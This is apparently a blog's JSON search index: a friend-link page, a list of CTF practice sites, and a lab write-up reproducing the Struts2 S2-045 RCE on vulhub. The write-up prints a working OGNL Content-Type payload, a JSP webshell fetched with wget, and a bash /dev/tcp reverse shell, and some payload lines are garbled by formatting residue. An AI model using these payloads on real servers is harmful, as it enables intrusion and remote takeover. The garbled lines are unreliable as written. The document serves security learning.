{"pages":[{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://bmovo.github.io/img/avatar.png 网站名称：baiduの博客 网站地址：https://bmovo.github.io 网站简介：网络安全，ctf小白 加载中，稍等几秒...","link":"/friend/index.html"}],"posts":[{"title":"安全学习/安全学习网站","text":"网站合集0x01.CTF资讯​ XCTF联赛：https://www.xctf.org.cn/ ​ 360安全客：https://www.anquanke.com/ ​ CTF-TIME：https://ctftime.org/event/list/ ​ CTF Rank：http://ctfrank.org/ 0x02.CTF练习1.BIN​ reversing：http://reversing.kr/ ​ pwnable：http://pwnable.kr/ ​ pwnable(TAIWAN)：https://pwnable.tw/ ​ exploit-exercises： ​ overthewire：https://overthewire.org/wargames/ ​ netgarage：https://io.netgarage.org/ ​ bin干货：http://security.cs.rpi.edu/courses/binexp-spring2015/ 2.SQL​ sqli-labs：https://github.com/Audi-1/sqli-labs ​ RedTigers Hackit：http://redtiger.labs.overthewire.org/ 3.XSS​ prompt：http://prompt.ml/0 ​ XSS Challenges：http://xss-quiz.int21h.jp/ ​ escape：https://alf.nu/alert1 ​ xss-game： 4.OJ平台以及CTF赛事复盘​ XCTF-OJ：https://adworld.xctf.org.cn/login ​ Pwnhub：https://pwnhub.cn/index ​ Jarvisoj：https://www.jarvisoj.com/login 5.国内综合练习​ 网络信息攻防学习平台：http://hackinglab.cn/ ​ 西普实验吧： ​ I春秋CTF挑战：https://www.ichunqiu.com/battalion?t=1 ​ 合天CTF：https://www.hetianlab.com/CTFrace.html ​ 南京邮电大学： ​ bugku： ​ CTF题目：https://captf.com ​ 黑客丛林之旅：http://www.fj543.com/hack/ ​ 红客闯关游戏：http://hkyx.myhack58.com/ 6.国外综合练习​ wechall：http://www.wechall.net/ ​ webhacking：https://webhacking.kr/ ​ ringzer0team：https://ringzer0ctf.com/challenge ​ backdoor：https://backdoor.sdslabs.co/ ​ smashthestack：http://smashthestack.org/ ​ overthewire：https://overthewire.org/wargames/ ​ w3challs：https://w3challs.com/ ​ pentesterlab：https://pentesterlab.com/exercises ​ id0-rsa：https://id0-rsa.pub/ 0x03.各种姿势的学习平台​ 吾爱破解：https://www.52pojie.cn/ ​ 看雪论坛：https://bbs.pediy.com/ ​ T00ls：https://www.t00ls.net/ 0x04.CTF-writeup​ CTF Writeup Summary：http://sec.yka.me/ ​ 360安全客：http://bobao.360.cn/ctf/ ​ CTF Writeup github：https://github.com/ctfs/ ​ Writeups：https://github.com/VulnHub/ctf-writeups","link":"/2020/07/26/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99/"},{"title":"S2-045","text":"S2-045 Remote Code Execution0x00.漏洞背景Struts2是第二代基于Model-View-Controller(MVC)模型的java企业级web应用框架，并成为当时国内外较为流行的容器软件中间件。jakarta是apache组织下的一套Java解决方案的开源软件的名称，包括很多子项目。Struts就是jakarta的紧密关联项目。 根据CNVD技术组成员单位——杭州安恒信息技术有限公司提供的分析情况，基于JakartaMultipart parser的文件上传模块在处理文件上传(multipart)的请求时候对异常信息做了捕获，并对异常信息做了OGNL表达式处理。但在在判断content-type不正确的时候会抛出异常并且带上Content-Type属性值，可通过精心构造附带OGNL表达的URL导致远程代码执行。 CNVD对漏洞的综合评级均为“高危”。由于struts 2.3.5之前的版本存在S2-016漏洞，因此有较多升级后的Apache struts2的版本为2.3.5及以上版本，极有可能受到漏洞的影响。 0x01.受影响的版本Struts2.3.5-Struts2.3.31 Struts2.5-Struts2.5.10 0x02.漏洞环境搭建a.从git仓库获取vulhub ​ 1) git clone https://github.com/vulhub/vulhub.git b.docker-compose工具的下载 c.在docker-compose.yml中有端口映射关系 d. 环境创建docker-compose -d up e. 查看环境docker ps -a f.进入docker的bash：docker exec -t -i CONTAINER ID /bin/bash 0x03.POC检测漏洞存在a.使用浏览器访问环境 b.使用burpsuite抓包，并利用vulhub自带的poc验证 Content-Type:%{ #context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].***\\*addHeader('vulhub',233\\*233)\\****}.multipart/form-data 发送multipart/form-data使得能够对ognl表达式进行解析执行 addHeader(‘vulhub’,233233)：添加头部的名称为vulhub，值为233\\233 c.使用网上的poc，实现命令执行 POC： Content-Type:&quot;%{(#bm='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='***\\*ls\\****').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new [java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&quot;](mailto:java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\) 0x04.利用poc构造简单的利用程序程序过于丑陋 无法显示 0x05.网站后门a.利用C刀自带的jsp木马后门 b.将文件放到目标主机能够访问的web站点下 c.使用命令：wget dst/1.jsp d.用Cknife尝试连接 e.试过其他方法，但还是这个最容易实现…… 0x06.反弹Shella.主要的命令 bash -i &gt;&amp; /dev/tcp/dst/port 0&gt;&amp;1 依赖输出重定向，将bash反弹给某个ip的某个端口[自己的想法] b.用nc命令监听port nc -lvp port c.命令执行完毕之后，能够拿到对应的bash 0x07.漏洞成因分析参考网站：大佬 a.从虚拟机中利用docker cp拷贝下对应的源码[版本：2.3.30] b.使用jd-gui进行解包和静态分析 c.从参考网站可知，寻找的重点应该在于对请求包的封装 在.\\dispatcher\\ng\\filter\\Strust2PrepareAndExecuteFilter中 可以找到对request的最初处理 在找到对应的类和方法","link":"/2020/07/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-045/"}],"tags":[],"categories":[]}